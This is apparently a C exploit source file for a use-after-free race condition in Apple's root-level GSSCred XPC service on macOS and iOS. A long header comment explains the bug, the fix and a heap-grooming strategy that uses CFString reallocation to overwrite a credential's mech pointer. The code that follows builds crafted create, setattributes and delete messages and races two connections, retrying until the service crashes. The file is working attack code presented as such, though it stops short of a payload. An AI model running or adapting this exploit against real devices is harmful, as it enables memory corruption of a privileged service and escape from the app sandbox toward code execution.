/*
 * gsscred-race
 * Brandon Azad
 *
 *
 * gsscred-race
 * ------------------------------------------------------------------------------------------------
 *
 *  gsscred-race is an exploit for a race condition found in the com.apple.GSSCred XPC service,
 *  which runs as root on macOS and iOS and which can be reached from within the default iOS
 *  application sandbox. By creating parallel connections to the GSSCred service we can trigger a
 *  use-after-free condition leading to a call to objc_msgSend() on a controlled pointer,
 *  eventually leading to code execution inside the GSSCred process.
 *
 *  TODO: Check if this is actually the final exploit strategy.
 *
 *
 * The vulnerability
 * ------------------------------------------------------------------------------------------------
 *
 *  The GSSCred service first creates a serial dispatch queue and initializes the XPC connection
 *  listener to run on that queue:
 *
 *  	runQueue = dispatch_queue_create("com.apple.GSSCred", DISPATCH_QUEUE_SERIAL);
 *  	heim_assert(runQueue != NULL, "dispatch_queue_create failed");
 *
 *  	conn = xpc_connection_create_mach_service("com.apple.GSSCred",
 *  	                                          runQueue,
 *  	                                          XPC_CONNECTION_MACH_SERVICE_LISTENER);
 *
 *  	xpc_connection_set_event_handler(conn, ^(xpc_object_t object) {
 *  		GSSCred_event_handler(object);
 *  	});
 *
 *  The XPC runtime will dispatch a call to GSSCred_event_handler() each time an event is received
 *  on the listener connection. In particular, when a client creates a connection to
 *  com.apple.GSSCred and sends the first XPC message, GSSCred_event_handler() will be invoked with
 *  the server-side XPC connection object.
 *
 *  Using a serial dispatch queue is important for clients that don't specifically implement
 *  support for parallel connections (for example, by protecting concurrent object accesses with
 *  locks). GSSCred does not implement any locking, relying on the serial processing of XPC events
 *  to protect against race conditions.
 *
 *  The GSSCred_event_handler() function is responsible for initializing an incoming client
 *  connection. It creates a server-side "peer" object to represent the connection context and sets
 *  the event handler that the XPC runtime will call when an event (such as a message from the
 *  client) is received on the connection:
 *
 *  	static void GSSCred_event_handler(xpc_connection_t peerconn)
 *  	{
 *  		struct peer *peer;
 *
 *  		peer = malloc(sizeof(*peer));
 *  		heim_assert(peer != NULL, "out of memory");
 *
 *  		peer->peer = peerconn;
 *  		peer->bundleID = CopySigningIdentitier(peerconn);
 *  		if (peer->bundleID == NULL) {
 *  			...
 *  		}
 *  		peer->session = HeimCredCopySession(xpc_connection_get_asid(peerconn));
 *  		heim_assert(peer->session != NULL, "out of memory");
 *
 *  		xpc_connection_set_context(peerconn, peer);
 *  		xpc_connection_set_finalizer_f(peerconn, peer_final);
 *
 *  		xpc_connection_set_event_handler(peerconn, ^(xpc_object_t event) {
 *  			GSSCred_peer_event_handler(peer, event);
 *  		});
 *  		xpc_connection_resume(peerconn);
 *  	}
 *
 *  The problem is that the target dispatch queue for the connection to the client ("peerconn" in
 *  the code) was never specified, and therefore defaults to libdispatch's default target queue,
 *  DISPATCH_TARGET_QUEUE_DEFAULT, which is a concurrent queue. From the documentation for
 *  xpc_connection_set_event_handler() in xpc/connection.h:
 *
 *  	Connections received by listeners are equivalent to those returned by
 *  	xpc_connection_create() with a non-NULL name argument and a NULL targetq
 *  	argument with the exception that you do not hold a reference on them.
 *  	You must set an event handler and activate the connection.
 *
 *  And here's the documentation from xpc_connection_create() about the targetq parameter:
 *
 *  	@param targetq
 *  	The GCD queue to which the event handler block will be submitted. This
 *  	parameter may be NULL, in which case the connection's target queue will be
 *  	libdispatch's default target queue, defined as DISPATCH_TARGET_QUEUE_DEFAULT.
 *  	The target queue may be changed later with a call to
 *  	xpc_connection_set_target_queue().
 *
 *  Thus, setting the target queue for the listener connection only is not sufficient: client
 *  connections will be received serially in the listener event handler, but the event handlers for
 *  different client connections can run in parallel.
 *
 *  The XPC documentation about concurrent execution of event handlers in different clients may be
 *  misleading at first glance. The documentation for xpc_connection_set_target_queue() states:
 *
 *  	The XPC runtime guarantees this non-preemptiveness even for concurrent target
 *  	queues. If the target queue is a concurrent queue, then XPC still guarantees
 *  	that there will never be more than one invocation of the connection's event
 *  	handler block executing concurrently. If you wish to process events
 *  	concurrently, you can dispatch_async(3) to a concurrent queue from within
 *  	the event handler.
 *
 *  It's important to understand that this guarantee is strictly per-connection: event handler
 *  blocks for different connections, even if they share the same underlying code, are considered
 *  different event handler blocks and are allowed to run concurrently.
 *
 *  The fix for this issue in GSSCred is to insert a call to xpc_connection_set_target_queue()
 *  before activating the client connection with xpc_connection_resume() to set the target
 *  queue for the client connection to the serial queue created earlier. For example:
 *
 *  		xpc_connection_set_event_handler(peerconn, ^(xpc_object_t event) {
 *  			GSSCred_peer_event_handler(peer, event);
 *  		});
 *  		xpc_connection_set_target_queue(peerconn, runQueue);		// added
 *  		xpc_connection_resume(peerconn);
 *
 *  This will guarantee that all client requests across all connections will be handled serially.
 *
 *
 * Exploit strategy
 * ------------------------------------------------------------------------------------------------
 *
 *  There are several ways to exploit this race condition, with varying levels of difficulty. After
 *  much experimentation, I eventually settled on triggering a use-after-free in the function
 *  do_SetAttrs() by invoking the do_Delete() function in parallel from another connection.
 *
 *  The do_SetAttrs() function handles the "setattributes" command from the client. Here is the
 *  code (edited for presentation):
 *
 *  	static void
 *  	do_SetAttrs(struct peer *peer, xpc_object_t request, xpc_object_t reply)
 *  	{
 *  		CFUUIDRef uuid = HeimCredCopyUUID(request, "uuid");
 *  		CFMutableDictionaryRef attrs;
 *  		CFErrorRef error = NULL;
 *
 *  		if (uuid == NULL)
 *  			return;
 *
 *  		if (!checkACLInCredentialChain(peer, uuid, NULL)) {
 *  			CFRelease(uuid);
 *  			return;
 *  		}
 *
 *  		HeimCredRef cred = (HeimCredRef)CFDictionaryGetValue(	// (a) The credential
 *  				peer->session->items, uuid);		//     pointer is copied to
 *  		CFRelease(uuid);					//     the stack.
 *  		if (cred == NULL)
 *  			return;
 *
 *  		heim_assert(CFGetTypeID(cred) == HeimCredGetTypeID(),
 *  				"cred wrong type");
 *
 *  		if (cred->attributes) {
 *  			attrs = CFDictionaryCreateMutableCopy(NULL, 0,
 *  					cred->attributes);
 *  			if (attrs == NULL)
 *  				return;
 *  		} else {
 *  			attrs = CFDictionaryCreateMutable(NULL, 0,
 *  					&kCFTypeDictionaryKeyCallBacks,
 *  					&kCFTypeDictionaryValueCallBacks);
 *  		}
 *
 *  		CFDictionaryRef replacementAttrs =			// (b) The attributes dict
 *  			HeimCredMessageCopyAttributes(			//     is deserialized from
 *  					request, "attributes",		//     the XPC message.
 *  					CFDictionaryGetTypeID());
 *  		if (replacementAttrs == NULL) {
 *  			CFRelease(attrs);
 *  			goto out;
 *  		}
 *
 *  		CFDictionaryApplyFunction(replacementAttrs,
 *  				updateCred, attrs);
 *  		CFRELEASE_NULL(replacementAttrs);
 *
 *  		if (!validateObject(attrs, &error)) {			// (c) The deserialized
 *  			addErrorToReply(reply, error);			//     attributes dict is
 *  			goto out;					//     validated.
 *  		}
 *
 *  		handleDefaultCredentialUpdate(peer->session,		// (d) The credential
 *  				cred, attrs);				//     pointer from (a) is
 *  									//     used.
 *  		// make sure the current caller is on the ACL list
 *  		addPeerToACL(peer, attrs);
 *
 *  		CFRELEASE_NULL(cred->attributes);
 *  		cred->attributes = attrs;
 *  	out:
 *  		CFRELEASE_NULL(error);
 *  	}
 *
 *  Since we fully control the contents of the XPC request, we can make most deserialization
 *  commands take a long time to run, which opens a nice wide race window. Here in do_SetAttrs()
 *  the HeimCredMessageCopyAttributes() function performs deserialization, meaning we have an
 *  opportunity to change the program state during its execution.
 *
 *  To unexpectedly change the program state while do_SetAttrs() is stalled we will use the
 *  do_Delete() function. This function is responsible for handling a "delete" command from the
 *  client. It will delete all credentials and all children of credentials matching the deletion
 *  query.
 *
 *  The code of this function is not that important but is presented here for completeness (again
 *  edited for presentation):
 *
 *  	static void
 *  	do_Delete(struct peer *peer, xpc_object_t request, xpc_object_t reply)
 *  	{
 *  		CFErrorRef error = NULL;
 *
 *  		CFArrayRef items = QueryCopy(peer, request, "query");	// (a) Credentials matching
 *  		if (items == NULL || CFArrayGetCount(items) == 0) {	//     the delete query are
 *  			const void *const keys[] =			//     copied to an array.
 *  				{ CFSTR("CommonErrorCode") };
 *  			const void *const values[] = { kCFBooleanTrue };
 *  			HCMakeError(&error,
 *  					kHeimCredErrorNoItemsMatchesQuery,
 *  					keys, values, 1);
 *  			goto out;
 *  		}
 *
 *  		CFIndex n, count = CFArrayGetCount(items);
 *  		for (n = 0; n < count; n++) {
 *  			HeimCredRef cred = (HeimCredRef)
 *  				CFArrayGetValueAtIndex(items, n);
 *  			heim_assert(CFGetTypeID(cred) == HeimCredGetTypeID(),
 *  					"cred wrong type");
 *
 *  			CFDictionaryRemoveValue(peer->session->items,
 *  					cred->uuid);
 *  			DeleteChildren(peer->session, cred->uuid);	// (b) Each child of a
 *  		}							//     matching credential
 *  									//     is deleted
 *  		notifyChangedCaches();					//     immediately.
 *  		HeimCredCTX.needFlush = 1;
 *
 *  	out:
 *  		if (error) {
 *  			addErrorToReply(reply, error);
 *  			CFRelease(error);
 *  		}
 *  		CFRELEASE_NULL(items);					// (c) The matching
 *  	}								//     credentials are
 *  									//     deleted.
 *
 *  The biggest thing to note about do_Delete() is that the child credentials are deleted first,
 *  then work is performed, then the parent credentials are deleted. This may or may not be an
 *  important factor, but in my limited testing the exploit seemed to run better when I deleted the
 *  target credential via its parent than when I deleted it directly.
 *
 *  Using these two functions, the race condition flow goes like this:
 *
 *  1. Create all the credentials we'll need. One of these credentials will be the UAF target. The
 *     HeimCred structure is 40 (0x28) bytes, so they are allocated from the 0x30 freelist.
 *
 *  2. Send the "setattributes" request for the target credential with an attributes dictionary
 *     that will take a long time to deserialize. A pointer to the target credential will be saved
 *     on the stack (or in a register) while HeimCredMessageCopyAttributes() is deserializing,
 *     allocating objects in a tight loop.
 *
 *     It turns out that in order to pass the validation check later, the only object type that
 *     HeimCredMessageCopyAttributes() can allocate in a loop is CFString objects. This is both
 *     good and bad: The good news is that, because CFString data is stored inline, we can force
 *     the CFString objects to be allocated from the 0x30 freelist. The bad news is that we can use
 *     only one null byte in the overwritten payload, and it has to be at or after offset 0x20.
 *
 *     Some quick experiments on my 2015 MacBook Pro indicated that deserializing an attributes
 *     dictionary with an array of 26000 strings should take about 10 milliseconds, which seemed
 *     plenty of time to try and win the race.
 *
 *  3. Once it's likely that do_SetAttrs() is in the allocation loop, send the "delete" request to
 *     delete the target credential.
 *
 *     The delete request actually specifies the parent of the target credential, but due to how
 *     do_Delete() is implemented the children will be deleted first. Adding more children than
 *     just the target credential may help buffer against spurious allocations. In my testing,
 *     using 3 children seemed to work well.
 *
 *  4. Once the target credential is deleted, it will be added to the 0x30 freelist, and hopefully
 *     picked up by HeimCredMessageCopyAttributes() to become a CFString. Since we control the
 *     contents of the allocated CFString objects, we can overwrite some of the fields in the
 *     target HeimCred object.
 *
 *  5. Eventually HeimCredMessageCopyAttributes() finishes and do_SetAttrs() resumes, not knowing
 *     that the contents of the credential pointer it stored have been changed. It passes the
 *     credential to handleDefaultCredentialUpdate() and all hell breaks loose.
 *
 *  Now, it's worth talking about how exactly we're going to overwrite the HeimCred object. Here's
 *  the structure definition:
 *
 *  	struct HeimCred_s {
 *  		CFRuntimeBase runtime;		// 00: 0x10 bytes
 *  		CFUUIDRef uuid;			// 10: 8 bytes
 *  		CFDictionaryRef attributes;	// 18: 8 bytes
 *  		struct HeimMech *mech;		// 20: 8 bytes
 *  	};					// Total: 0x28 bytes
 *
 *  We want to overwrite one of these fields with a controlled value, most likely a pointer to
 *  controlled memory. The best way to get controlled memory at a controlled address in macOS and
 *  iOS over XPC is to send very large XPC data objects that will be mapped directly from the
 *  sender's address space into the receiver as a VM_ALLOCATE region.
 *
 *  Typically, the kernel will place a program at an address like 0x000000010c65d000: somewhere
 *  above but close to 4GB (0x100000000), with the exact address randomized by ASLR. Large
 *  VM_ALLOCATE objects might be placed at 0x0000000116097000: after the program, but still fairly
 *  close to 0x100000000. By comparison, the MALLOC_TINY heap (for small objects like those we're
 *  targeting) on macOS and iOS might start at 0x00007fb6f0400000. Thus, if we want to overwrite a
 *  field of the HeimCred structure with a pointer to controlled memory, it'll have to look like
 *  one of these. (There are exceptions for special-value pointers handled by Objective-C and
 *  CoreFoundation, but we'll ignore those for now.)
 *
 *  Now let's take a look at how CFString works, to see what exactly we can overwrite. Here's a
 *  hypothetical structure for a short CFString object:
 *
 *  	struct CFString_short_s {
 *  		CFRuntimeBase runtime;		// 00: 0x10 bytes
 *  		uint8_t length;			// 10: 1 byte
 *  		char character_data[1];		// 11: variable size
 *  	};
 *
 *  The characters of a CFString are stored inline, after a CFRuntimeBase header and length field.
 *  Thus, we can control bytes 0x11 through 0x2f of the allocated CFString if we want to keep it in
 *  the 0x30 freelist. These bytes overlap with the three pointers stored in the HeimCred
 *  structure, which is perfect.
 *
 *  However, the only controlled data we have in the process is on the heap or in a VM_ALLOCATE
 *  region, and pointers to both types of regions contain null bytes. CFString, like most C-style
 *  strings, considers the null character as a terminator, and will stop copying into the inline
 *  character array after the first null byte. Thus, to stay in the 0x30 freelist, our first null
 *  byte must come at or after offset 0x20. This leaves just the "mech" field of the HeimCred
 *  structure as a possible exploit target.
 *
 *  Fortunately, because current macOS and iOS platforms are all little-endian, the pointer is laid
 *  out least significant byte to most significant byte. If we use an address like
 *  0x0000000120202020 (with all the null bytes at the start) for our controlled data, then the
 *  low 6 bytes of the address (including the null) will be copied into the "mech" field, leaving
 *  the remaining 2 (high) bytes of the pointer with whatever value they had originally.
 *
 *  As it turns out, this is completely sufficient for our needs. The "mech" field was originally a
 *  pointer to a heap object, and the first 2 (high) bytes of a heap pointer are 0. Thus, being
 *  able to copy only a single null byte still allows us to point "mech" to controlled data.
 *
 *  The first time the corrupted credential is used is in a call to
 *  handleDefaultCredentialUpdate(), which coincidentally uses the credential's "mech" field before
 *  anything else. This makes this exploitation strategy quite promising.
 *
 *  TODO: Finish exploit writeup.
 *
 */

#include "gsscred_race.h"

#include <assert.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <xpc/xpc.h>

#include <CoreFoundation/CoreFoundation.h>

// ---- Debugging macros --------------------------------------------------------------------------

#ifndef DEBUG_LEVEL
#define DEBUG_LEVEL DEBUG
#endif

#define DEBUG_AT_LEVEL(level)	DEBUG && level <= DEBUG_LEVEL

#if DEBUG
#define DEBUG_TRACE(fmt, ...)		printf("Debug: "fmt"\n", ##__VA_ARGS__)
#define DEBUG_TRACE_LEVEL(level, fmt, ...)			\
	do {							\
		if (level <= DEBUG_LEVEL) {			\
			DEBUG_TRACE(fmt, ##__VA_ARGS__);	\
		}						\
	} while (0)
#else
#define DEBUG_TRACE(fmt, ...)		do {} while (0)
#define DEBUG_TRACE_LEVEL(fmt, ...)	do {} while (0)
#endif
#define WARNING(fmt, ...)		printf("Warning: "fmt"\n", ##__VA_ARGS__)
#define ERROR(fmt, ...)			printf("Error: "fmt"\n", ##__VA_ARGS__)

// ---- Utility functions and macros --------------------------------------------------------------

#define min(a,b)	((a) < (b) ? (a) : (b))
#define max(a,b)	((a) > (b) ? (a) : (b))

// ---- Some definitions from Heimdal-520 ---------------------------------------------------------

static const char *kHEIMObjectType              = "kHEIMObjectType";
static const char *kHEIMObjectKerberos          = "kHEIMObjectKerberos";
static const char *kHEIMAttrType                = "kHEIMAttrType";
static const char *kHEIMTypeKerberos            = "kHEIMTypeKerberos";
static const char *kHEIMAttrUUID                = "kHEIMAttrUUID";
static const char *kHEIMAttrParentCredential    = "kHEIMAttrParentCredential";
static const char *kHEIMAttrBundleIdentifierACL = "kHEIMAttrBundleIdentifierACL";

// ---- Exploit parameters ------------------------------------------------------------------------

static const char *GSSCRED_SERVICE_NAME = "com.apple.GSSCred";

static const size_t CREDENTIAL_COUNT              = 4;
static const size_t ACL_STRING_SIZE               = 31;		// malloc 48 freelist
static const size_t ACL_STRING_COUNT              = 26000;	// 10 ms
static const size_t SETATTRIBUTES_TO_DELETE_DELAY = 5000;	// 5 ms
static const size_t POST_CREATE_CREDENTIALS_DELAY = 10000;	// 10 ms
static const size_t RETRY_RACE_DELAY              = 100000;	// 100 ms

// ---- Exploit implementation --------------------------------------------------------------------

// State for managing the GSSCred race.
struct gsscred_race_state {
	// The connection on which we will send the setattributes request.
	xpc_connection_t setattributes_connection;
	// The connection on which we will send the delete request.
	xpc_connection_t delete_connection;
	// An array of CREDENTIAL_COUNT create requests.
	xpc_object_t *create_requests;
	// The setattributes request. The uuid parameter will need to be changed each attempt.
	xpc_object_t setattributes_request;
	// The delete request, which will delete all the children followed by the parent.
	xpc_object_t delete_request;
	// A semaphore that will be signalled when we receive the setattributes reply.
	dispatch_semaphore_t setattributes_reply_done;
	// Whether either connection has been interrupted, indicating a crash.
	bool connection_interrupted;
};

// Fill the given buffer with the bundle ID of this application, if available. Otherwise the buffer
// is not touched.
static void
get_bundle_id(char *buffer, size_t size) {
	CFDictionaryRef bundle_dict = CFBundleGetInfoDictionary(CFBundleGetMainBundle());
	if (bundle_dict != NULL) {
		CFStringRef bundle_id = CFDictionaryGetValue(bundle_dict,
				CFSTR("CFBundleIdentifier"));
		if (bundle_id != NULL) {
			CFStringGetCString(bundle_id, buffer, size, kCFStringEncodingUTF8);
		}
	}
}

// Build the request objects for the GSSCred race. We do this all upfront.
static void
gsscred_race_build_requests(struct gsscred_race_state *state) {
	state->create_requests = calloc(CREDENTIAL_COUNT, sizeof(*state->create_requests));
	assert(state->create_requests != NULL);

	uuid_t child_uuid  = { 0xab };
	uint16_t *child_uuid_16 = (uint16_t *) child_uuid;
	uuid_t parent_uuid;
	memcpy(parent_uuid, child_uuid, sizeof(parent_uuid));
	size_t credential_index = 0;

	// Build the create request for the parent credential:
	// {
	//     "command":    "create",
	//     "attributes": {
	//         "kHEIMObjectType": "kHEIMObjectKerberos",
	//         "kHEIMAttrType":   "kHEIMTypeKerberos",
	//         "kHEIMAttrUUID":   ab 0000,
	//     },
	// }
	xpc_object_t create_attributes = xpc_dictionary_create(NULL, NULL, 0);
	xpc_object_t create_request    = xpc_dictionary_create(NULL, NULL, 0);
	xpc_dictionary_set_string(create_attributes, kHEIMObjectType, kHEIMObjectKerberos);
	xpc_dictionary_set_string(create_attributes, kHEIMAttrType,   kHEIMTypeKerberos);
	xpc_dictionary_set_uuid(  create_attributes, kHEIMAttrUUID,   parent_uuid);
	xpc_dictionary_set_string(create_request, "command",    "create");
	xpc_dictionary_set_value( create_request, "attributes", create_attributes);
	xpc_release(create_attributes);
	state->create_requests[credential_index] = create_request;
	credential_index++;

	// Build the create request for the child credentials:
	// {
	//     "command":    "create",
	//     "attributes": {
	//         "kHEIMObjectType":           "kHEIMObjectKerberos",
	//         "kHEIMAttrType":             "kHEIMTypeKerberos",
	//         "kHEIMAttrUUID":             ab 0001,
	//         "kHEIMAttrParentCredential": ab 0000,
	//     },
	// }
	for (; credential_index < CREDENTIAL_COUNT; credential_index++) {
		child_uuid_16[2] = (uint16_t) credential_index;
		create_attributes = xpc_dictionary_create(NULL, NULL, 0);
		create_request    = xpc_dictionary_create(NULL, NULL, 0);
		xpc_dictionary_set_string(create_attributes, kHEIMObjectType,           kHEIMObjectKerberos);
		xpc_dictionary_set_string(create_attributes, kHEIMAttrType,             kHEIMTypeKerberos);
		xpc_dictionary_set_uuid(  create_attributes, kHEIMAttrUUID,             child_uuid);
		xpc_dictionary_set_uuid(  create_attributes, kHEIMAttrParentCredential, parent_uuid);
		xpc_dictionary_set_string(create_request, "command",    "create");
		xpc_dictionary_set_value( create_request, "attributes", create_attributes);
		xpc_release(create_attributes);
		state->create_requests[credential_index] = create_request;
	}

	// Build the setattributes request for the parent credential:
	// {
	//     "command":    "setattributes",
	//     "uuid":       ???,       // chosen at request send time
	//     "attributes": {
	//         "kHEIMAttrBundleIdentifierACL": [
	//             my bundle id,    // we don't want checkACLInCredentialChain() to take long
	//             "AAAA...",
	//             "AAAA...",
	//             ...,
	//         ],
	//     },
	// }
	char bundle_id[512] = "*";
	get_bundle_id(bundle_id, sizeof(bundle_id));
	xpc_object_t new_acl               = xpc_array_create(NULL, 0);
	xpc_object_t new_attributes        = xpc_dictionary_create(NULL, NULL, 0);
	xpc_object_t setattributes_request = xpc_dictionary_create(NULL, NULL, 0);
	xpc_array_set_string(new_acl, XPC_ARRAY_APPEND, bundle_id);
	char acl_string[ACL_STRING_SIZE];
	memset(acl_string, 'A', sizeof(acl_string));
	acl_string[sizeof(acl_string) - 1] = 0;
	for (size_t i = 0; i < ACL_STRING_COUNT; i++) {
		xpc_array_set_string(new_acl, XPC_ARRAY_APPEND, acl_string);
	}
	xpc_dictionary_set_value(new_attributes, kHEIMAttrBundleIdentifierACL, new_acl);
	xpc_dictionary_set_string(setattributes_request, "command",    "setattributes");
	xpc_dictionary_set_value( setattributes_request, "attributes", new_attributes);
	xpc_release(new_acl);
	xpc_release(new_attributes);
	state->setattributes_request = setattributes_request;

	// Build the delete request for the parent.
	// {
	//     "command": "delete",
	//     "query":   {
	//         "kHEIMAttrType":   "kHEIMTypeKerberos",
	//         "kHEIMAttrUUID":   ab 0000,
	//     },
	// }
	xpc_object_t delete_query   = xpc_dictionary_create(NULL, NULL, 0);
	xpc_object_t delete_request = xpc_dictionary_create(NULL, NULL, 0);
	xpc_dictionary_set_string(delete_query, kHEIMAttrType, kHEIMTypeKerberos);
	xpc_dictionary_set_uuid(  delete_query, kHEIMAttrUUID, parent_uuid);
	xpc_dictionary_set_string(delete_request, "command", "delete");
	xpc_dictionary_set_value( delete_request, "query",   delete_query);
	xpc_release(delete_query);
	state->delete_request = delete_request;
}

// Generate a connection to GSSCred with the specified event handler.
static xpc_connection_t
gsscred_xpc_connect(xpc_handler_t handler) {
	xpc_connection_t connection
		= xpc_connection_create_mach_service(GSSCRED_SERVICE_NAME, NULL, 0);
	assert(connection != NULL);
	xpc_connection_set_event_handler(connection, handler);
	xpc_connection_activate(connection);
	return connection;
}

// Create all the GSSCred connections.
static void
gsscred_race_create_connections(struct gsscred_race_state *state) {
	// Create the connection on which we will send the setattributes message.
	state->setattributes_connection = gsscred_xpc_connect(^(xpc_object_t event) {
		if (event == XPC_ERROR_CONNECTION_INTERRUPTED) {
			state->connection_interrupted = true;
		}
#if DEBUG_AT_LEVEL(3)
		char *desc = xpc_copy_description(event);
		DEBUG_TRACE("setattributes connection event: %s", desc);
		free(desc);
#endif
	});

	// Create the connection on which we will send the delete message.
	state->delete_connection = gsscred_xpc_connect(^(xpc_object_t event) {
		if (event == XPC_ERROR_CONNECTION_INTERRUPTED) {
			state->connection_interrupted = true;
		}
#if DEBUG_AT_LEVEL(3)
		char *desc = xpc_copy_description(event);
		DEBUG_TRACE("delete connection event: %s", desc);
		free(desc);
#endif
	});
}

// Initialize the state for exploiting the GSSCred race condition.
static void
gsscred_race_init(struct gsscred_race_state *state) {
	gsscred_race_build_requests(state);
	gsscred_race_create_connections(state);
	state->setattributes_reply_done = dispatch_semaphore_create(0);
	state->connection_interrupted = false;
}

// Clean up all resources used by the GSSCred race state.
static void
gsscred_race_deinit(struct gsscred_race_state *state) {
	xpc_release(state->setattributes_connection);
	xpc_release(state->delete_connection);
	for (size_t i = 0; i < CREDENTIAL_COUNT; i++) {
		xpc_release(state->create_requests[i]);
	}
	free(state->create_requests);
	xpc_release(state->setattributes_request);
	xpc_release(state->delete_request);
	dispatch_release(state->setattributes_reply_done);
}

// Send all the credential creation requests to GSSCred. We will do this on both connections in
// parallel to prompt GSSCred to create the extra thread now, to avoid a potential thread creation
// stall later when we send the delete request. (I haven't actually tested if this is necessary, it
// just seemed like a good idea.)
static bool
gsscred_race_create_credentials_sync(struct gsscred_race_state *state) {
	const size_t connection_count = 2;
	xpc_connection_t connections[connection_count] = {
		state->setattributes_connection, state->delete_connection
	};
	__block bool success = true;
	dispatch_group_t group = dispatch_group_create();
	dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
	for (size_t ci = 0; ci < connection_count; ci++) {
		xpc_connection_t connection = connections[ci];
		dispatch_group_async(group, queue, ^{
			// Each dispatcher is responsible for handling one slice of the create
			// requests on one connection.
			for (size_t i = ci; i < CREDENTIAL_COUNT; i += connection_count) {
				xpc_object_t reply = xpc_connection_send_message_with_reply_sync(
					connection,
					state->create_requests[i]);
#if DEBUG_AT_LEVEL(3)
				char *desc = xpc_copy_description(reply);
				DEBUG_TRACE("create reply %zu: %s", i, desc);
				free(desc);
#endif
				bool failed = (xpc_dictionary_get_value(reply, "error") != NULL);
				if (failed) {
					success = false;
					break;
				}
			}
		});
	}
	dispatch_group_wait(group, DISPATCH_TIME_FOREVER);
	dispatch_release(group);
	return success;
}

// Choose a random target credential for the setattributes message. The only restriction is that it
// can't be the parent credential, since we want the target to be deleted quickly.
static void
gsscred_race_choose_setattributes_target(struct gsscred_race_state *state) {
	// First choose a random non-parent credential as the target UUID.
	size_t target_index = (rand() % (CREDENTIAL_COUNT - 1)) + 1;
	xpc_object_t create_request = state->create_requests[target_index];
	assert(create_request != NULL);
	xpc_object_t create_attributes = xpc_dictionary_get_value(create_request, "attributes");
	assert(create_attributes != NULL);
	const uint8_t *target_uuid = xpc_dictionary_get_uuid(create_attributes, kHEIMAttrUUID);
	assert(target_uuid != NULL);
	// Set the UUID in the setattributes message.
	xpc_dictionary_set_uuid(state->setattributes_request, "uuid", target_uuid);
}

// Send the setattributes request asynchronously. This will cause do_SetAttrs() to stall in
// HeimCredMessageCopyAttributes() for awhile (hopefully around 10 milliseconds) while it
// continuously allocates CFString objects.
static void
gsscred_race_setattributes_async(struct gsscred_race_state *state) {
	// First update the setattributes message to target a random child credential. This isn't
	// so important with a small number of children, but when there are many credentials it
	// helps ensure we aren't always stuck at one end of the child deallocation order.
	gsscred_race_choose_setattributes_target(state);
	// Send the setattributes message asynchronously.
	xpc_connection_send_message_with_reply(
			state->setattributes_connection,
			state->setattributes_request,
			NULL,
			^(xpc_object_t reply) {
		dispatch_semaphore_signal(state->setattributes_reply_done);
#if DEBUG_AT_LEVEL(3)
		// We never expect feedback.
		char *desc = xpc_copy_description(reply);
		DEBUG_TRACE("setattributes reply: %s", desc);
		free(desc);
#endif
#if DEBUG
		assert(xpc_dictionary_get_value(reply, "error") == NULL);
#endif
	});
}

// Send the delete request synchronously. This will cause all the child credentials to be deleted
// and hopefully allow the target credential to be reallocated as a CFString for setattributes.
static void
gsscred_race_delete_credentials_sync(struct gsscred_race_state *state) {
	xpc_object_t reply = xpc_connection_send_message_with_reply_sync(
			state->delete_connection,
			state->delete_request);
	// We never expect feedback.
#if DEBUG_AT_LEVEL(3)
	char *desc = xpc_copy_description(reply);
	DEBUG_TRACE("delete reply: %s", desc);
	free(desc);
#endif
#if DEBUG
	assert(xpc_dictionary_get_value(reply, "error") == NULL);
#endif
	xpc_release(reply);
}

// Wait for all asynchronous messages to finish.
static void
gsscred_race_synchronize(struct gsscred_race_state *state) {
	// We're only waiting for setattributes; all other requests are synchronous.
	dispatch_semaphore_wait(state->setattributes_reply_done, DISPATCH_TIME_FOREVER);
}

// Run the race condition.
static bool
gsscred_race_run() {
	bool success = false;
	struct gsscred_race_state state;

	gsscred_race_init(&state);

	// Loop until we win.
	const size_t MAX_TRIES = 4000;
	for (size_t try = 1;; try++) {
		// Create all the credentials synchronously.
		bool ok = gsscred_race_create_credentials_sync(&state);
		if (!ok) {
			ERROR("Could not create the credentials");
			break;
		}

		// Wait a little while after sending the credentials for GSSCred's allocator to
		// calm down. Probably not necessary, but better safe than sorry.
		usleep(POST_CREATE_CREDENTIALS_DELAY);

		// Send the setattributes request asynchronously. do_SetAttrs() will store a
		// pointer to the target credential on the stack and then loop continuously
		// allocating memory. The reuse of this pointer later in the function is the UAF,
		// and our race window is however long do_SetAttrs() spends in the allocation loop.
		gsscred_race_setattributes_async(&state);

		// Sleep for awhile, until there's a good chance that the delete request will
		// arrive in the middle of the race window.
		usleep(SETATTRIBUTES_TO_DELETE_DELAY);

		// Send the delete message synchronously.
		gsscred_race_delete_credentials_sync(&state);

		// Wait for the setattributes request to finish.
		gsscred_race_synchronize(&state);

		// If we got a Connection Interrupted error, then we crashed GSSCred.
		if (state.connection_interrupted) {
			DEBUG_TRACE("Crash!");
			DEBUG_TRACE("Won the race after %zu %s", try,
					(try == 1 ? "try" : "tries"));
			success = true;
			break;
		}

		// If we've run out of tries, give up.
		if (try >= MAX_TRIES) {
			ERROR("Could not win the race after %zu tries", try);
			break;
		}

		// If we didn't get a Connection Interrupted error, then GSSCred is still running.
		// Sleep for awhile to let GSSCred settle down, then try again.
		usleep(RETRY_RACE_DELAY);
	}

	// Clean up all state.
	gsscred_race_deinit(&state);

	return success;
}

// ---- Public API --------------------------------------------------------------------------------

bool gsscred_race() {
	DEBUG_TRACE("gsscred_race");
	return gsscred_race_run();
}
